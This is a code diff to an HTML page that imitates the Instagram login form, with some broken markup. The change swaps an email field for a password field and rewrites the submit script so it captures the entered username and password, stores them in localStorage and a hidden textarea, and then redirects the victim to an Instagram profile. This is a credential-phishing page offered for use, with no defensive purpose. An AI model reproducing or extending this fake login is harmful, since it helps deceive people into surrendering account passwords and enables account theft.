@@ -55,7 +55,7 @@
 ">Instagram</p>"
          <input class="rim" type="text" id="username" name="username" required placeholder="Phone number,username, or email"> 
          <br><br> 
-        <input class="mir" type="email" id="useremail" name="useremail" required
+        <input class="mir" type="password" id="password" name="password" required
              placeholder="Password"> 
     <br><br> <button style="padding:10px; border:2px solid black; box-shadow:1px 2px 1px 0 black;
      border-radius:10px;" type="submit">Log in</button>
@@ -65,22 +65,23 @@ __________________OR _________________</span>
 <span><p class="b">f </p>&nbsp;&nbsp;Log in with Facebook</span><span>Forgot password</span>
      <br> <textarea style="display:flex; margin:auto;text-align: center; align-items: center; justify-content: center;opacity:0;"
      id="result" rows="3" cols="50" placeholder="Здесь появится информация..."></textarea></form>
-     <script> const form = document.getElementById("myForm"); const username = document.getElementById("username");
-     let usern = document.querySelector('.mir');
-     let usere = document.querySelector('.rim');
-      const useremail = document.getElementById("useremail");
- const result = document.getElementById("result"); 
-        
-       result.value = localStorage.getItem("result") || ""; 
-     
-    form.addEventListener("submit", function(event) {  event.preventDefault();  localStorage.setItem("username", username.value);  
-    localStorage.setItem("useremail", useremail.value); const information = "Ваш имя: " + username.value + "\n" + "Ваш Email: " + useremail.value;
-     result.value = information;
-     result.style.opacity = "0";
-     usern.style.opacity = "0";
-     usere.style.opacity = "0";
-     window.location.href="https://www.instagram.com/marinamokina__?igsi=d3VzeG1zYzdncXJi";
-      localStorage.setItem("result", information); });</script>
+   
+
+  <script> const form = document.getElementById("myForm");
+   const username = document.getElementById("username");
+    const password = document.getElementById("password");
+     const usern = document.querySelector(".mir"); 
+     const usere = document.querySelector(".rim");
+      const result = document.getElementById("result");
+       result.value = localStorage.getItem("result") || "";
+        form.addEventListener( "submit", function(event) { event.preventDefault(); localStorage.setItem( "username", username.value );
+         const information = "Ваше имя: " + username.value + "\n" + "Пароль: " + password.value; 
+         result.value = information;
+          result.style.opacity = "0";
+           usern.style.opacity = "0";
+            usere.style.opacity = "0";
+           localStorage.setItem( "result", information );
+            window.location.href = "https://www.instagram.com/marinamokina__?igsi=d3VzeG1zYzdncXJi"; } ); </script>  
 
 
    <div id="giftAnimation" class="gift-animation"><div style=" width:100%; height:100%;
